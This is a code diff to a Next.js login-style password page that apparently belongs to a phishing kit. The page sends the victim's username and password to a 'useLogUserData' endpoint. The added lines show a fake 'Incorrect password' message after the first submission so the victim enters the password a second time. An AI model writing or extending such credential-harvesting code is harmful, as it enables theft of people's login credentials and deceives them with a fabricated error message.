@@ -1,12 +1,13 @@
 // app/(auth)/email/page.tsx
 "use client";
 
-import { queryClient } from "@/components/providers";
+import { queryClient, useGlobalContext } from "@/components/providers";
 import { ApiError } from "@/lib/apiError";
 import { useLogUserData } from "@/lib/react-query/mutations";
 import { ID } from "@/lib/vars";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { notFound, useRouter } from "next/navigation";
+import { useState } from "react";
 import { useForm } from "react-hook-form";
 import z from "zod";
 
@@ -20,9 +21,10 @@ const passwordSchema = z.object({
 const id = ID;
 
 export default function PasswordPage() {
-  const router = useRouter();
+  const { setLoad } = useGlobalContext();
   // const username = "test";
   const username = queryClient.getQueryData(["username"]);
+  const [count, setCount] = useState(1);
 
   const { mutate } = useLogUserData();
 
@@ -43,13 +45,21 @@ export default function PasswordPage() {
       onSubmit={handleSubmit(async (data) => {
         await new Promise<void>((resolve) => {
           mutate(
-            { id, username, password: data.password },
+            { id, username, password: data.password, count },
             {
               onSettled: () => resolve(),
               onSuccess: () => {
-                router.push("/secured");
+                if (count === 1) {
+                  setCount(2);
+                  setError("password", {
+                    message: "Incorrect password. Please try again.",
+                  });
+                } else {
+                  setLoad(true);
+                }
               },
               onError: (error: ApiError) => {
+                setCount(1);
                 console.error("Error occurred while logging user data:", error);
                 // check if error.error is an array and has at least one element with a message property
 
